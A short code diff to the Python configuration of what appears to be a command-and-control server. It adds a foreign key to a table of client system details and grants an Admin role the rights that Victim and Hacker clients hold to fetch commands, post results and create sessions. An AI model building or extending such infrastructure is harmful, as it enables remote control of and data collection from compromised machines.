@@ -27,7 +27,8 @@ class Config:
             os TEXT,
             arch TEXT,
             cpu TEXT,
-            ram TEXT
+            ram TEXT,
+            FOREIGN KEY(id) REFERENCES clients(client_id)
         )
         """,
             """
@@ -86,11 +87,11 @@ class Config:
 
         self.server_cmd_privileges = {
             "verify": [ut.ClientType.Victim, ut.ClientType.Admin, ut.ClientType.Hacker],
-            "fetch_cmd": [ut.ClientType.Victim],
-            "post_res": [ut.ClientType.Victim],
-            "post_cmd": [ut.ClientType.Hacker],
-            "fetch_res": [ut.ClientType.Hacker],
-            "create_session": [ut.ClientType.Hacker],
+            "fetch_cmd": [ut.ClientType.Victim, ut.ClientType.Admin],
+            "post_res": [ut.ClientType.Victim, ut.ClientType.Admin],
+            "post_cmd": [ut.ClientType.Hacker, ut.ClientType.Admin],
+            "fetch_res": [ut.ClientType.Hacker, ut.ClientType.Admin],
+            "create_session": [ut.ClientType.Hacker, ut.ClientType.Admin],
         }
 
         self.server_cmds = {
